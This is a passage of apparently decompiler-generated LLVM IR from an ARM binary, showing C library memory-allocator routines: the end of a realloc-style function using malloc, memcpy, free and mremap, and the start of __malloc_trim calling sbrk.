  store i32 %v3_ebec, i32* %r2.global-to-local, align 4
  br i1 %v9_ebe8, label %dec_label_pc_ebf4, label %dec_label_pc_ec00

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebe0
  %v1_ebf4 = add i32 %v3_ebec, 8
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  %v3_ebf4 = load i32, i32* %v2_ebf4, align 4
  store i32 %v3_ebf4, i32* %r3.global-to-local, align 4
  %v9_ebf8 = icmp eq i32 %v3_ebf4, %v2_eb70
  br i1 %v9_ebf8, label %dec_label_pc_ec04, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebe0, %dec_label_pc_ebf4
  %v0_ec00 = call i32 @abort()
  store i32 %v0_ec00, i32* %r0.global-to-local, align 4
  %v0_ec04.pre = load i32, i32* @r1, align 4
  %v1_ec04.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_ec04

dec_label_pc_ec04:                                ; preds = %dec_label_pc_ebf4, %dec_label_pc_ec00
  %v1_ec04 = phi i32 [ %v3_ebec, %dec_label_pc_ebf4 ], [ %v1_ec04.pre, %dec_label_pc_ec00 ]
  %v0_ec04 = phi i32 [ %v3_ebe0, %dec_label_pc_ebf4 ], [ %v0_ec04.pre, %dec_label_pc_ec00 ]
  %v2_ec04 = add i32 %v1_ec04, 8
  %v3_ec04 = inttoptr i32 %v2_ec04 to i32*
  store i32 %v0_ec04, i32* %v3_ec04, align 4
  %v0_ec08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec08 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec08 = add i32 %v1_ec08, 12
  %v3_ec08 = inttoptr i32 %v2_ec08 to i32*
  store i32 %v0_ec08, i32* %v3_ec08, align 4
  %v1_ecc4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ec10:                                ; preds = %dec_label_pc_eb80, %dec_label_pc_ebd0, %dec_label_pc_ebbc
  %v1_ec10 = add i32 %v1_eb54, -7
  store i32 %v1_ec10, i32* %r0.global-to-local, align 4
  %v1_ec14 = call i32 @malloc(i32 %v1_ec10)
  store i32 %v1_ec14, i32* @r0, align 4
  store i32 %v1_ec14, i32* %r1.global-to-local, align 4
  %v2_ec18 = icmp eq i32 %v1_ec14, 0
  br i1 %v2_ec18, label %bb31, label %dec_label_pc_ec24

bb31:                                             ; preds = %dec_label_pc_ec10
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ec24:                                ; preds = %dec_label_pc_ec10
  %v1_ec2c.pre = load i32, i32* @r4, align 4
  %v1_ec24 = add i32 %v1_ec14, -4
  %v2_ec24 = inttoptr i32 %v1_ec24 to i32*
  %v3_ec24 = load i32, i32* %v2_ec24, align 4
  store i32 %v3_ec24, i32* @r3, align 4
  %v1_ec28 = add i32 %v1_ec14, -8
  store i32 %v1_ec28, i32* @r7, align 4
  %v9_ec2c = icmp eq i32 %v1_ec28, %v1_ec2c.pre
  br i1 %v9_ec2c, label %.thread2, label %dec_label_pc_ec3c

.thread2:                                         ; preds = %dec_label_pc_ec24
  %v2_ec30 = and i32 %v3_ec24, -4
  store i32 %v2_ec30, i32* %r3.global-to-local, align 4
  %v2_ec34 = load i32, i32* @r6, align 4
  %v3_ec34 = add i32 %v2_ec34, %v2_ec30
  store i32 %v3_ec34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec24
  %v0_ec3c = load i32, i32* @r6, align 4
  %v1_ec3c = add i32 %v0_ec3c, -4
  store i32 %v1_ec3c, i32* @r2, align 4
  %v3_ec40 = udiv i32 %v1_ec3c, 4
  store i32 %v3_ec40, i32* @ip, align 4
  %tmp37 = and i32 %v1_ec3c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_ec48 = icmp ult i32 %v1_ec3c, 36
  %v3_ec48 = or i1 %tmp38, %v2_ec48
  %v0_ec58 = load i32, i32* @r5, align 4
  br i1 %v3_ec48, label %dec_label_pc_ec58, label %dec_label_pc_ec4c

dec_label_pc_ec4c:                                ; preds = %dec_label_pc_ec3c
  store i32 %v0_ec58, i32* @r1, align 4
  %v0_ec50 = call i32 @memcpy()
  store i32 %v0_ec50, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec3c
  %v1_ec58 = inttoptr i32 %v0_ec58 to i32*
  %v2_ec58 = load i32, i32* %v1_ec58, align 4
  store i32 %v2_ec58, i32* %r3.global-to-local, align 4
  %v2_ec5c = inttoptr i32 %v1_ec14 to i32*
  store i32 %v2_ec58, i32* %v2_ec5c, align 4
  %v0_ec60 = load i32, i32* @r5, align 4
  %v1_ec60 = add i32 %v0_ec60, 4
  %v2_ec60 = inttoptr i32 %v1_ec60 to i32*
  %v3_ec60 = load i32, i32* %v2_ec60, align 4
  store i32 %v3_ec60, i32* %r3.global-to-local, align 4
  %v1_ec64 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec64 = add i32 %v1_ec64, 4
  %v3_ec64 = inttoptr i32 %v2_ec64 to i32*
  store i32 %v3_ec60, i32* %v3_ec64, align 4
  %v0_ec68 = load i32, i32* @r5, align 4
  %v1_ec68 = add i32 %v0_ec68, 8
  %v2_ec68 = inttoptr i32 %v1_ec68 to i32*
  %v3_ec68 = load i32, i32* %v2_ec68, align 4
  store i32 %v3_ec68, i32* %r3.global-to-local, align 4
  %v0_ec6c = load i32, i32* @ip, align 4
  %v1_ec70 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec70 = add i32 %v1_ec70, 8
  %v3_ec70 = inttoptr i32 %v2_ec70 to i32*
  store i32 %v3_ec68, i32* %v3_ec70, align 4
  %tmp39 = icmp ult i32 %v0_ec6c, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_ec78

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ec58
  %v0_ec78 = load i32, i32* @r5, align 4
  %v1_ec78 = add i32 %v0_ec78, 12
  %v2_ec78 = inttoptr i32 %v1_ec78 to i32*
  %v3_ec78 = load i32, i32* %v2_ec78, align 4
  store i32 %v3_ec78, i32* %r3.global-to-local, align 4
  %v1_ec7c = load i32, i32* %r1.global-to-local, align 4
  %v2_ec7c = add i32 %v1_ec7c, 12
  %v3_ec7c = inttoptr i32 %v2_ec7c to i32*
  store i32 %v3_ec78, i32* %v3_ec7c, align 4
  %v0_ec80 = load i32, i32* @r5, align 4
  %v1_ec80 = add i32 %v0_ec80, 16
  %v2_ec80 = inttoptr i32 %v1_ec80 to i32*
  %v3_ec80 = load i32, i32* %v2_ec80, align 4
  store i32 %v3_ec80, i32* %r3.global-to-local, align 4
  %v0_ec84 = load i32, i32* @ip, align 4
  %v1_ec88 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec88 = add i32 %v1_ec88, 16
  %v3_ec88 = inttoptr i32 %v2_ec88 to i32*
  store i32 %v3_ec80, i32* %v3_ec88, align 4
  %tmp40 = icmp ult i32 %v0_ec84, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_ec90

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec78
  %v0_ec90 = load i32, i32* @r5, align 4
  %v1_ec90 = add i32 %v0_ec90, 20
  %v2_ec90 = inttoptr i32 %v1_ec90 to i32*
  %v3_ec90 = load i32, i32* %v2_ec90, align 4
  store i32 %v3_ec90, i32* %r3.global-to-local, align 4
  %v1_ec94 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec94 = add i32 %v1_ec94, 20
  %v3_ec94 = inttoptr i32 %v2_ec94 to i32*
  store i32 %v3_ec90, i32* %v3_ec94, align 4
  %v0_ec98 = load i32, i32* @r5, align 4
  %v1_ec98 = add i32 %v0_ec98, 24
  %v2_ec98 = inttoptr i32 %v1_ec98 to i32*
  %v3_ec98 = load i32, i32* %v2_ec98, align 4
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  %v1_ec9c = load i32, i32* %r1.global-to-local, align 4
  %v2_ec9c = add i32 %v1_ec9c, 24
  %v3_ec9c = inttoptr i32 %v2_ec9c to i32*
  store i32 %v3_ec98, i32* %v3_ec9c, align 4
  %v0_eca0 = load i32, i32* @ip, align 4
  %v7_eca0 = icmp eq i32 %v0_eca0, 9
  br i1 %v7_eca0, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_ec90
  %v1_eca4 = load i32, i32* @r5, align 4
  %v2_eca4 = add i32 %v1_eca4, 28
  %v3_eca4 = inttoptr i32 %v2_eca4 to i32*
  %v4_eca4 = load i32, i32* %v3_eca4, align 4
  store i32 %v4_eca4, i32* %r3.global-to-local, align 4
  %v2_eca8 = load i32, i32* %r1.global-to-local, align 4
  %v3_eca8 = add i32 %v2_eca8, 28
  %v4_eca8 = inttoptr i32 %v3_eca8 to i32*
  store i32 %v4_eca4, i32* %v4_eca8, align 4
  %v1_ecac = load i32, i32* @r5, align 4
  %v2_ecac = add i32 %v1_ecac, 32
  %v3_ecac = inttoptr i32 %v2_ecac to i32*
  %v4_ecac = load i32, i32* %v3_ecac, align 4
  store i32 %v4_ecac, i32* %r3.global-to-local, align 4
  %v2_ecb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_ecb0 = add i32 %v2_ecb0, 32
  %v4_ecb0 = inttoptr i32 %v3_ecb0 to i32*
  store i32 %v4_ecac, i32* %v4_ecb0, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_ec90, %dec_label_pc_ec78, %dec_label_pc_ec58, %dec_label_pc_ec4c, %bb32
  %v0_ecb4 = load i32, i32* @r5, align 4
  store i32 %v0_ecb4, i32* @r0, align 4
  %v0_ecb8 = call i32 @free()
  store i32 %v0_ecb8, i32* %r0.global-to-local, align 4
  %v0_ecbc = load i32, i32* @r7, align 4
  %v1_ecbc = add i32 %v0_ecbc, 8
  store i32 %v1_ecbc, i32* @r4, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ecc4:                                ; preds = %bb30, %.thread2, %dec_label_pc_ec04
  %v0_ecd8 = phi i32 [ %v3_ec34, %.thread2 ], [ %v1_eb4c, %bb30 ], [ %v1_ecc4.pre, %dec_label_pc_ec04 ]
  %v0_ecc4 = load i32, i32* @sb, align 4
  %v2_ecc4 = sub i32 %v0_ecd8, %v0_ecc4
  store i32 %v2_ecc4, i32* %r1.global-to-local, align 4
  %v0_eccc = load i32, i32* @sl, align 4
  %v1_eccc = add i32 %v0_eccc, 4
  %v2_eccc = inttoptr i32 %v1_eccc to i32*
  %v3_eccc = load i32, i32* %v2_eccc, align 4
  %tmp41 = icmp ugt i32 %v2_ecc4, 15
  %v1_ecf4 = urem i32 %v3_eccc, 2
  store i32 %v1_ecf4, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_ecf4, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecc4
  %v2_ecd8 = or i32 %v1_ecf4, %v0_ecd8
  store i32 %v2_ecd8, i32* %r3.global-to-local, align 4
  store i32 %v2_ecd8, i32* %v2_eccc, align 4
  %v0_ece0 = load i32, i32* @sl, align 4
  %v1_ece0 = load i32, i32* %r0.global-to-local, align 4
  %v2_ece0 = add i32 %v1_ece0, %v0_ece0
  store i32 %v2_ece0, i32* %r2.global-to-local, align 4
  %v1_ece4 = add i32 %v2_ece0, 4
  %v2_ece4 = inttoptr i32 %v1_ece4 to i32*
  %v3_ece4 = load i32, i32* %v2_ece4, align 4
  %v1_ece8 = or i32 %v3_ece4, 1
  store i32 %v1_ece8, i32* %r3.global-to-local, align 4
  store i32 %v1_ece8, i32* %v2_ece4, align 4
  br label %dec_label_pc_ed24

dec_label_pc_ecf4:                                ; preds = %dec_label_pc_ecc4
  %v2_ecf8 = add i32 %v0_eccc, %v0_ecc4
  store i32 %v2_ecf8, i32* %r0.global-to-local, align 4
  %v2_ecfc = or i32 %v1_ecf4, %v0_ecc4
  store i32 %v2_ecfc, i32* %r3.global-to-local, align 4
  %v1_ed00 = or i32 %v2_ecc4, 1
  store i32 %v1_ed00, i32* %r2.global-to-local, align 4
  store i32 %v2_ecfc, i32* %v2_eccc, align 4
  %v0_ed08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ed08 = load i32, i32* %r0.global-to-local, align 4
  %v2_ed08 = add i32 %v1_ed08, 4
  %v3_ed08 = inttoptr i32 %v2_ed08 to i32*
  store i32 %v0_ed08, i32* %v3_ed08, align 4
  %v0_ed0c = load i32, i32* %r0.global-to-local, align 4
  %v1_ed0c = load i32, i32* %r1.global-to-local, align 4
  %v2_ed0c = add i32 %v1_ed0c, %v0_ed0c
  store i32 %v2_ed0c, i32* %r2.global-to-local, align 4
  %v1_ed10 = add i32 %v2_ed0c, 4
  %v2_ed10 = inttoptr i32 %v1_ed10 to i32*
  %v3_ed10 = load i32, i32* %v2_ed10, align 4
  %v1_ed14 = or i32 %v3_ed10, 1
  store i32 %v1_ed14, i32* %r3.global-to-local, align 4
  store i32 %v1_ed14, i32* %v2_ed10, align 4
  %v0_ed1c = load i32, i32* %r0.global-to-local, align 4
  %v1_ed1c = add i32 %v0_ed1c, 8
  store i32 %v1_ed1c, i32* @r0, align 4
  %v0_ed20 = call i32 @free()
  store i32 %v0_ed20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed24

dec_label_pc_ed24:                                ; preds = %dec_label_pc_ecd4, %dec_label_pc_ecf4
  %v0_ed24 = load i32, i32* @sl, align 4
  %v1_ed24 = add i32 %v0_ed24, 8
  store i32 %v1_ed24, i32* @r4, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ed2c:                                ; preds = %bb29
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r1.global-to-local, align 4
  %v4_ed34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_ed34, i32* @r8, align 4
  %v2_ed38 = inttoptr i32 %v1_eb48 to i32*
  %v3_ed38 = load i32, i32* %v2_ed38, align 4
  store i32 %v3_ed38, i32* @r4, align 4
  %v1_ed3c = add i32 %v4_ed34, 860
  %v2_ed3c = inttoptr i32 %v1_ed3c to i32*
  %v3_ed3c = load i32, i32* %v2_ed3c, align 4
  %v1_ed40 = add i32 %v3_ed38, 4
  %v1_ed44 = add i32 %v3_ed3c, -1
  store i32 %v1_ed44, i32* %r2.global-to-local, align 4
  %v2_ed48 = add i32 %v1_ed40, %v1_ed44
  %v1_ed4c = load i32, i32* @sb, align 4
  %v2_ed4c = add i32 %v2_ed48, %v1_ed4c
  store i32 %v2_ed4c, i32* %r3.global-to-local, align 4
  %v2_ed50 = sub i32 0, %v3_ed3c
  %v3_ed50 = and i32 %v2_ed4c, %v2_ed50
  store i32 %v3_ed50, i32* @r7, align 4
  %v2_ed54 = sub i32 %v3_ed50, %v3_ed38
  store i32 %v2_ed54, i32* @fp, align 4
  %v9_ed58 = icmp eq i32 %v1_eb4c, %v2_ed54
  br i1 %v9_ed58, label %dec_label_pc_edcc, label %dec_label_pc_ed60

dec_label_pc_ed60:                                ; preds = %dec_label_pc_ed2c
  %v2_ed60 = sub i32 %v1_eb48, %v3_ed38
  store i32 %v2_ed60, i32* %r0.global-to-local, align 4
  %v2_ed64 = add i32 %v3_ed38, %v1_eb4c
  store i32 %v2_ed64, i32* %r1.global-to-local, align 4
  store i32 %v3_ed50, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_ed70 = call i32 @mremap(i32 %v2_ed60, i32 %v2_ed64, i32 %v3_ed50, i32 1)
  store i32 %v4_ed70, i32* %r0.global-to-local, align 4
  %v7_ed74 = icmp eq i32 %v4_ed70, -1
  br i1 %v7_ed74, label %dec_label_pc_edc0, label %dec_label_pc_ed7c

dec_label_pc_ed7c:                                ; preds = %dec_label_pc_ed60
  %v1_ed7c = load i32, i32* @r4, align 4
  %v2_ed7c = add i32 %v1_ed7c, %v4_ed70
  store i32 %v2_ed7c, i32* %r0.global-to-local, align 4
  %v0_ed80 = load i32, i32* @fp, align 4
  %v1_ed80 = or i32 %v0_ed80, 2
  store i32 %v1_ed80, i32* %r3.global-to-local, align 4
  %v2_ed84 = add i32 %v2_ed7c, 4
  %v3_ed84 = inttoptr i32 %v2_ed84 to i32*
  store i32 %v1_ed80, i32* %v3_ed84, align 4
  %v0_ed88 = load i32, i32* @r8, align 4
  %v1_ed88 = add i32 %v0_ed88, 868
  %v2_ed88 = inttoptr i32 %v1_ed88 to i32*
  %v3_ed88 = load i32, i32* %v2_ed88, align 4
  store i32 %v3_ed88, i32* %r3.global-to-local, align 4
  %v1_ed8c = add i32 %v0_ed88, 880
  %v2_ed8c = inttoptr i32 %v1_ed8c to i32*
  %v3_ed8c = load i32, i32* %v2_ed8c, align 4
  store i32 %v3_ed8c, i32* %r2.global-to-local, align 4
  %v0_ed90 = load i32, i32* @r6, align 4
  %v2_ed90 = sub i32 %v3_ed88, %v0_ed90
  store i32 %v2_ed90, i32* %r3.global-to-local, align 4
  %v1_ed94 = load i32, i32* @r7, align 4
  %v2_ed94 = add i32 %v1_ed94, %v2_ed90
  store i32 %v2_ed94, i32* %r1.global-to-local, align 4
  %v1_ed98 = add i32 %v0_ed88, 872
  %v2_ed98 = inttoptr i32 %v1_ed98 to i32*
  %v3_ed98 = load i32, i32* %v2_ed98, align 4
  store i32 %v3_ed98, i32* %r3.global-to-local, align 4
  %v1_eda0 = add i32 %v0_ed88, 884
  %v2_eda0 = inttoptr i32 %v1_eda0 to i32*
  %v3_eda0 = load i32, i32* %v2_eda0, align 4
  store i32 %v3_eda0, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_ed94, %v3_ed8c
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_ed7c
  store i32 %v2_ed94, i32* %v2_ed8c, align 4
  %v0_eda8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_eda8.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_ed7c, %bb33
  %v1_eda8 = phi i32 [ %v0_ed88, %dec_label_pc_ed7c ], [ %v1_eda8.pre, %bb33 ]
  %v0_eda8 = phi i32 [ %v2_ed94, %dec_label_pc_ed7c ], [ %v0_eda8.pre, %bb33 ]
  %v2_eda8 = add i32 %v1_eda8, 868
  %v3_eda8 = inttoptr i32 %v2_eda8 to i32*
  store i32 %v0_eda8, i32* %v3_eda8, align 4
  %v0_edac = load i32, i32* %r1.global-to-local, align 4
  %v1_edac = load i32, i32* %r3.global-to-local, align 4
  %v2_edac = add i32 %v1_edac, %v0_edac
  store i32 %v2_edac, i32* %r1.global-to-local, align 4
  %v1_edb0 = load i32, i32* %r2.global-to-local, align 4
  %v0_edb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_edb4 = add i32 %v0_edb4, 8
  store i32 %v1_edb4, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_edac, %v1_edb0
  br i1 %tmp43, label %bb35, label %dec_label_pc_edf8

bb35:                                             ; preds = %bb34
  %v5_edb8 = load i32, i32* @r8, align 4
  %v6_edb8 = add i32 %v5_edb8, 884
  %v7_edb8 = inttoptr i32 %v6_edb8 to i32*
  store i32 %v2_edac, i32* %v7_edb8, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edc0:                                ; preds = %dec_label_pc_ed60
  %v0_edc0 = load i32, i32* @sb, align 4
  %v1_edc0 = add i32 %v0_edc0, 4
  store i32 %v1_edc0, i32* %r3.global-to-local, align 4
  %v0_edc4 = load i32, i32* @r6, align 4
  %v3_edc4 = icmp ult i32 %v0_edc4, %v1_edc0
  br i1 %v3_edc4, label %dec_label_pc_edd4, label %dec_label_pc_edc0.dec_label_pc_edcc_crit_edge

dec_label_pc_edc0.dec_label_pc_edcc_crit_edge:    ; preds = %dec_label_pc_edc0
  %v0_edcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edc0.dec_label_pc_edcc_crit_edge, %dec_label_pc_ed2c
  %v0_edcc = phi i32 [ %v0_edcc.pre, %dec_label_pc_edc0.dec_label_pc_edcc_crit_edge ], [ %v0_eb34, %dec_label_pc_ed2c ]
  store i32 %v0_edcc, i32* @r4, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edc0
  %v1_edd4 = add i32 %v0_edc0, -7
  store i32 %v1_edd4, i32* %r0.global-to-local, align 4
  %v1_edd8 = call i32 @malloc(i32 %v1_edd4)
  store i32 %v1_edd8, i32* @r0, align 4
  store i32 %v1_edd8, i32* @r4, align 4
  %v2_eddc = icmp eq i32 %v1_edd8, 0
  br i1 %v2_eddc, label %dec_label_pc_edf8, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_edd4
  %v0_ede4 = load i32, i32* @r6, align 4
  %v1_ede4 = add i32 %v0_ede4, -8
  store i32 %v1_ede4, i32* @r2, align 4
  %v0_ede8 = load i32, i32* @r5, align 4
  store i32 %v0_ede8, i32* @r1, align 4
  %v0_edec = call i32 @memcpy()
  %v0_edf0 = load i32, i32* @r5, align 4
  store i32 %v0_edf0, i32* @r0, align 4
  %v0_edf4 = call i32 @free()
  store i32 %v0_edf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %bb31, %bb35, %bb34, %dec_label_pc_edd4, %dec_label_pc_edcc, %dec_label_pc_ed24, %.thread6, %dec_label_pc_eb94, %dec_label_pc_ede4
  store i32 %v2_eae0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r2.global-to-local, align 4
  %v4_ee08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 48) to i32*), align 4
  store i32 %v4_ee08, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_ee08)
  br label %dec_label_pc_ee14

dec_label_pc_ee14:                                ; preds = %dec_label_pc_eb14, %dec_label_pc_eabc, %dec_label_pc_eaa4, %dec_label_pc_edf8
  %v0_ee14 = load i32, i32* @r4, align 4
  store i32 %v0_ee14, i32* %r0.global-to-local, align 4
  store i32 %v3_ea84, i32* @r4, align 4
  store i32 %v6_ea84, i32* @r5, align 4
  store i32 %v9_ea84, i32* @r6, align 4
  store i32 %v12_ea84, i32* @r7, align 4
  store i32 %v15_ea84, i32* @r8, align 4
  store i32 %v18_ea84, i32* @sb, align 4
  store i32 %v21_ea84, i32* @sl, align 4
  store i32 %v24_ea84, i32* @fp, align 4
  store i32 %v27_ea84, i32* @lr, align 4
  ret i32 %v0_ee14

; uselistorder directives
  uselistorder i32 %v2_edac, { 1, 0, 2 }
  uselistorder i32 %v2_ed94, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ed70, { 1, 0, 2 }
  uselistorder i32 %v3_ed50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ecf4, { 2, 1, 0 }
  uselistorder i32 %v2_ecc4, { 1, 0, 2 }
  uselistorder i32 %v0_ec58, { 1, 0 }
  uselistorder i32 %v1_ec14, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_eb78, { 0, 2, 1, 3 }
  uselistorder i32 %v2_eb70, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_eb54, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_eb4c, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_eb48, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_eb38, { 1, 0 }
  uselistorder i32 %v0_eb34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_eb0c, { 1, 0 }
  uselistorder i32 %v0_ea9c, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 22, 13, 15, 14, 16, 23, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder label %dec_label_pc_ee14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_edf8, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_ed24, { 1, 0 }
  uselistorder label %dec_label_pc_ecc4, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ec10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ec04, { 1, 0 }
  uselistorder label %dec_label_pc_ec00, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_ee28(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ee28:
  %v0_ee28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ee28, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_ee28
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_ee28, %bb
  %v10_ee40 = phi i32 [ %arg1, %dec_label_pc_ee28 ], [ 0, %bb ]
  ret i32 %v10_ee40

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_ee44 = add i32 %arg2, 44
  %v2_ee44 = inttoptr i32 %v1_ee44 to i32*
  %v3_ee44 = load i32, i32* %v2_ee44, align 4
  %v12_ee48 = load i32, i32* @r7, align 4
  %v1_ee4c = add i32 %v3_ee44, 4
  %v2_ee4c = inttoptr i32 %v1_ee4c to i32*
  %v3_ee4c = load i32, i32* %v2_ee4c, align 4
  %v1_ee50 = add i32 %arg2, 860
  %v2_ee50 = inttoptr i32 %v1_ee50 to i32*
  %v3_ee50 = load i32, i32* %v2_ee50, align 4
  store i32 %v3_ee50, i32* @r4, align 4
  %v1_ee54 = and i32 %v3_ee4c, -4
  store i32 %v1_ee54, i32* @r6, align 4
  %v1_ee58 = add i32 %v1_ee54, -17
  %v2_ee5c = add i32 %v1_ee58, %v3_ee50
  store i32 %arg2, i32* @r5, align 4
  %v2_ee68 = sub i32 %v2_ee5c, %arg1
  store i32 %v3_ee50, i32* %r1.global-to-local, align 4
  %v2_ee70 = udiv i32 %v2_ee68, %v3_ee50
  %v1_ee74 = add i32 %v2_ee70, -1
  store i32 %v1_ee74, i32* %r0.global-to-local, align 4
  %v2_ee78 = mul i32 %v1_ee74, %v3_ee50
  store i32 %v2_ee78, i32* @r7, align 4
  %v2_ee7c = icmp eq i32 %v2_ee78, 0
  store i1 %v2_ee7c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_ee78, 1
  br i1 %tmp8, label %dec_label_pc_eee4, label %dec_label_pc_ee84

dec_label_pc_ee84:                                ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_ee88 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_ee88, i32* %r0.global-to-local, align 4
  %v0_ee8c = load i32, i32* @r5, align 4
  %v1_ee8c = add i32 %v0_ee8c, 44
  %v2_ee8c = inttoptr i32 %v1_ee8c to i32*
  %v3_ee8c = load i32, i32* %v2_ee8c, align 4
  %v0_ee90 = load i32, i32* @r6, align 4
  %v2_ee90 = add i32 %v0_ee90, %v3_ee8c
  %v9_ee94 = icmp eq i32 %v1_ee88, %v2_ee90
  store i1 %v9_ee94, i1* @cpsr_z, align 1
  store i32 %v1_ee88, i32* @r4, align 4
  br i1 %v9_ee94, label %dec_label_pc_eea0, label %dec_label_pc_eee4

dec_label_pc_eea0:                                ; preds = %dec_label_pc_ee84
  %v0_eea0 = load i32, i32* @r7, align 4
  %v1_eea0 = sub i32 0, %v0_eea0
  store i32 %v1_eea0, i32* %r0.global-to-local, align 4
  %v1_eea4 = call i32 @__GI_sbrk(i32 %v1_eea0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_eeac = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_eeac, i32* %r0.global-to-local, align 4
  %v7_eeb0 = icmp eq i32 %v1_eeac, -1
  store i1 %v7_eeb0, i1* @cpsr_z, align 1
  br i1 %v7_eeb0, label %dec_label_pc_eee4, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %dec_label_pc_eea0
  %v0_eeb8 = load i32, i32* @r4, align 4
  %v2_eeb8 = sub i32 %v0_eeb8, %v1_eeac
  store i32 %v2_eeb8, i32* %r0.global-to-local, align 4
  %v9_eeb8 = icmp eq i32 %v0_eeb8, %v1_eeac
  store i1 %v9_eeb8, i1* @cpsr_z, align 1
  br i1 %v9_eeb8, label %dec_label_pc_eee4, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_eeb8
  %v0_eec0 = load i32, i32* @r5, align 4
  %v1_eec0 = add i32 %v0_eec0, 872
  %v2_eec0 = inttoptr i32 %v1_eec0 to i32*
  %v3_eec0 = load i32, i32* %v2_eec0, align 4
